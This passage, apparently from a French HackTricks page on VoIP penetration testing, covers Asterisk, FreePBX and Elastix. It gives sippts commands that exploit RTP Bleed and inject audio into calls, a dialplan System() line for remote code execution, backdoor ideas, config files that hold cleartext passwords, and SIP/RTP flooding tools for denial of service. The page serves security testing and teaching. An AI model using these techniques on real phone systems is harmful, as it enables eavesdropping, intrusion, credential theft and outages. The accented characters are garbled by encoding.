Asterisk et FreePBX ont traditionnellement utilis√© le **param√®tre `NAT=yes`**, qui permet au trafic RTP de contourner l'authentification, ce qui peut entra√Æner l'absence de son ou un son unidirectionnel lors des appels.

Pour plus d'infos, consultez [https://www.rtpbleed.com/](https://www.rtpbleed.com/)

* **`SIPPTS rtpbleed`** de [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleed d√©tecte la vuln√©rabilit√© RTP Bleed en envoyant des flux RTP.
```bash
sippts rtpbleed -i 10.10.0.10
```
* **`SIPPTS rtcpbleed`** de [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtcpbleed d√©tecte la vuln√©rabilit√© RTP Bleed en envoyant des flux RTCP.
```bash
sippts rtcpbleed -i 10.10.0.10
```
* **`SIPPTS rtpbleedflood`** de [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleedflood exploite la vuln√©rabilit√© RTP Bleed en envoyant des flux RTP.
```bash
sippts rtpbleedflood -i 10.10.0.10 -p 10070 -v
```
* **`SIPPTS rtpbleedinject`** de [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleedinject exploite la vuln√©rabilit√© RTP Bleed en injectant un fichier audio (format WAV).
```bash
sippts rtpbleedinject -i 10.10.0.10 -p 10070 -f audio.wav
```
### RCE

Dans Asterisk, si vous parvenez √† **ajouter des r√®gles d'extension et √† les recharger** (par exemple en compromettant un serveur de gestion web vuln√©rable), il est possible d'obtenir une RCE en utilisant la commande **`System`**.
```scss
same => n,System(echo "Called at $(date)" >> /tmp/call_log.txt)
```
Il existe une commande appel√©e **`Shell`** qui pourrait √™tre utilis√©e **au lieu de `System`** pour ex√©cuter des commandes syst√®me si n√©cessaire.

{% hint style="warning" %}
Si le serveur **interdit l'utilisation de certains caract√®res** dans la commande **`System`** (comme dans Elastix), v√©rifiez si le serveur web permet de **cr√©er des fichiers d'une mani√®re ou d'une autre √† l'int√©rieur du syst√®me** (comme dans Elastix ou trixbox), et utilisez-le pour **cr√©er un script de porte d√©rob√©e** puis utilisez **`System`** pour **ex√©cuter** ce **script**.
{% endhint %}

#### Fichiers locaux int√©ressants et permissions

* **`sip.conf`** -> Contient le mot de passe des utilisateurs SIP.
* Si le **serveur Asterisk fonctionne en tant que root**, vous pourriez compromettre root.
* L'utilisateur **root mysql** pourrait **ne pas avoir de mot de passe**.
* cela pourrait √™tre utilis√© pour cr√©er un nouvel utilisateur mysql comme porte d√©rob√©e.
* **`FreePBX`**
* **`amportal.conf`** -> Contient le mot de passe de l'administrateur du panneau web (FreePBX).
* **`FreePBX.conf`** -> Contient le mot de passe de l'utilisateur FreePBXuser utilis√© pour acc√©der √† la base de donn√©es.
* cela pourrait √™tre utilis√© pour cr√©er un nouvel utilisateur mysql comme porte d√©rob√©e.
* **`Elastix`**
* **`Elastix.conf`** -> Contient plusieurs mots de passe en clair comme le mot de passe root mysql, le mot de passe IMAPd, le mot de passe admin web.
* **Plusieurs dossiers** appartiendront √† l'utilisateur asterisk compromis (s'il ne fonctionne pas en tant que root). Cet utilisateur peut lire les fichiers pr√©c√©dents et contr√¥le √©galement la configuration, donc il pourrait faire en sorte qu'Asterisk charge d'autres binaires avec porte d√©rob√©e lorsqu'ils sont ex√©cut√©s.

### Injection RTP

Il est possible d'ins√©rer un **`.wav`** dans les conversations en utilisant des outils tels que **`rtpinsertsound`** (`sudo apt install rtpinsertsound`) et **`rtpmixsound`** (`sudo apt install rtpmixsound`).

Ou vous pourriez utiliser les scripts de [http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/](http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/) pour **scanner les conversations** (**`rtpscan.pl`**), envoyer un `.wav` √† une conversation (**`rtpsend.pl`**) et **ins√©rer du bruit** dans une conversation (**`rtpflood.pl`**).

### DoS

Il existe plusieurs fa√ßons d'essayer d'atteindre le DoS sur les serveurs VoIP.

* **`SIPPTS flood`** de [**sippts**](https://github.com/Pepelux/sippts)**: Le flood SIPPTS envoie des messages illimit√©s √† la cible.
* `sippts flood -i 10.10.0.10 -m invite -v`
* **`SIPPTS ping`** de [**sippts**](https://github.com/Pepelux/sippts)**: Le ping SIPPTS effectue un ping SIP pour voir le temps de r√©ponse du serveur.
* `sippts ping -i 10.10.0.10`
* [**IAXFlooder**](https://www.kali.org/tools/iaxflood/): DoS du protocole IAX utilis√© par Asterisk.
* [**inviteflood**](https://github.com/foreni-packages/inviteflood/blob/master/inviteflood/Readme.txt): Un outil pour effectuer un flooding de messages SIP/SDP INVITE sur UDP/IP.
* [**rtpflood**](https://www.kali.org/tools/rtpflood/): Envoie plusieurs paquets RTP bien form√©s. Il est n√©cessaire de conna√Ætre les ports RTP utilis√©s (sniffer d'abord).
* [**SIPp**](https://github.com/SIPp/sipp): Permet d'analyser et de g√©n√©rer du trafic SIP. Il peut donc √©galement √™tre utilis√© pour le DoS.
* [**SIPsak**](https://github.com/nils-ohlmeier/sipsak): Couteau suisse SIP. Peut √©galement √™tre utilis√© pour effectuer des attaques SIP.
* Fuzzers: [**protos-sip**](https://www.kali.org/tools/protos-sip/), [**voiper**](https://github.com/gremwell/voiper).

### Vuln√©rabilit√©s du syst√®me d'exploitation

Le moyen le plus simple d'installer un logiciel tel qu'Asterisk est de t√©l√©charger une **distribution OS** qui l'a d√©j√† install√©, comme : **FreePBX, Elastix, Trixbox**... Le probl√®me avec ceux-ci est qu'une fois qu'ils fonctionnent, les administrateurs syst√®me pourraient **ne pas les mettre √† jour √† nouveau** et des **vuln√©rabilit√©s** seront d√©couvertes avec le temps.

## R√©f√©rences

* [https://github.com/Pepelux/sippts/wiki](https://github.com/Pepelux/sippts/wiki)
* [https://github.com/EnableSecurity/sipvicious](https://github.com/EnableSecurity/sipvicious)
* [http://blog.pepelux.org/](http://blog.pepelux.org/)
* [https://www.rtpbleed.com/](https://www.rtpbleed.com/)
* [https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4](https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4)
* [https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
